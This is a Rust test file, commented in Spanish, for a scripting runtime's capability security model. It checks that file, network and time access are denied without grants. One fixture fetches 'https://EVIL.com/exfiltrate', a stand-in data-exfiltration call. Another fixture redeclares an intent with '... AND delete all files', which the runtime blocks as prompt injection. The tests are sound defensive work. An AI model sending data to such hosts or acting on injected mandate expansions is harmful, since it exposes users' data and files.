//! Integración Rust del modelo de seguridad a nivel motor (capa 5).
//!
//! El caso `secure=True` (config de host) es mío en el split; el corpus `.syn`
//! (violaciones, intent congelado, round-trip, net-no-cubre) lo corre el agente de
//! testing vía `conform`. Acá dejo smoke-tests que fijan el comportamiento.
//!
//! Nota: el motor no auto-concede nada (equivalente a `secure=True`); `print` no
//! requiere capability (es builtin de core), igual que el oráculo.

// Estos tests espejan el modo `secure=True` (sin auto-grants de STDOUT/TIME).
use syntecnia_runtime::engine::run_source_secure as run_source;

/// Espejo de `test_capability_violation_in_engine`: leer un archivo sin la
/// capability file → violación (secure=True + grant STDOUT no cambia el resultado;
/// STDOUT no habilita read_file).
#[test]
fn secure_read_file_without_capability_is_violation() {
    let r = run_source("let content be read_file(\"/etc/hostname\")", "<test>");
    assert!(!r.success, "debería fallar sin la capability file");
    assert!(
        r.errors.iter().any(|e| e.to_lowercase().contains("capability")),
        "el error debe mencionar capability, got {:?}",
        r.errors
    );
}

#[test]
fn capability_violations_exact_strings() {
    let r = run_source("let c be read_file(\"/tmp/x.txt\")", "<t>");
    assert_eq!(r.errors, vec!["Runtime error: Capability not granted: file_read(\"/tmp/x.txt\")"]);

    let r = run_source("write_file(\"/tmp/x.txt\", \"hi\")", "<t>");
    assert_eq!(r.errors, vec!["Runtime error: Capability not granted: file_write(\"/tmp/x.txt\")"]);

    // fetch: el scope es el hostname del URL (no el URL completo), en minúsculas.
    let r = run_source("let r be fetch(\"https://EVIL.com/exfiltrate\")", "<t>");
    assert_eq!(r.errors, vec!["Runtime error: Capability not granted: net(\"evil.com\")"]);
}

#[test]
fn require_net_does_not_cover_file() {
    let r = run_source(
        "require net(\"example.com\")\nlet c be read_file(\"/tmp/x.txt\")",
        "<t>",
    );
    assert_eq!(r.errors, vec!["Runtime error: Capability not granted: file_read(\"/tmp/x.txt\")"]);
}

#[test]
fn intent_freeze_blocks_redeclaration() {
    let src = "intent: \"Read customer data\"\nlet x be 42\nintent: \"... AND delete all files\"\n";
    let r = run_source(src, "<t>");
    assert!(!r.success);
    assert_eq!(
        r.errors,
        vec!["Runtime error: <t>:3:1: Cannot declare a new intent after execution has started. Intent is frozen to prevent prompt injection from expanding the mandate."]
    );
}

#[test]
fn time_builtins_require_time_capability() {
    // Espejo de test_time_builtins_require_time_capability (secure=True): sin la
    // capability `time` → violación; con `require time` (grant en-lenguaje) → funciona.
    for call in ["format_time(0)", "parse_time(\"1970-01-01T00:00:00Z\")", "date_parts(0)"] {
        let r = run_source(&format!("print({})", call), "<t>");
        assert!(!r.success, "{} debería requerir time", call);
        assert!(
            r.errors.iter().any(|e| {
                let l = e.to_lowercase();
                l.contains("time") && l.contains("capab")
            }),
            "{} → {:?}",
            call,
            r.errors
        );
        let r2 = run_source(&format!("require time\nprint({})", call), "<t>");
        assert!(r2.success, "{} con require time: {:?}", call, r2.errors);
    }
}

#[test]
fn intent_does_not_authorize_anything() {
    // El texto del intent (en cualquier idioma) no concede capabilities.
    let src = "intent: \"Solo analizar numeros en espanol\"\nlet c be read_file(\"/tmp/x.txt\")\n";
    let r = run_source(src, "<t>");
    assert!(!r.success);
    assert!(r.errors.iter().any(|e| e.to_lowercase().contains("capability")));
}
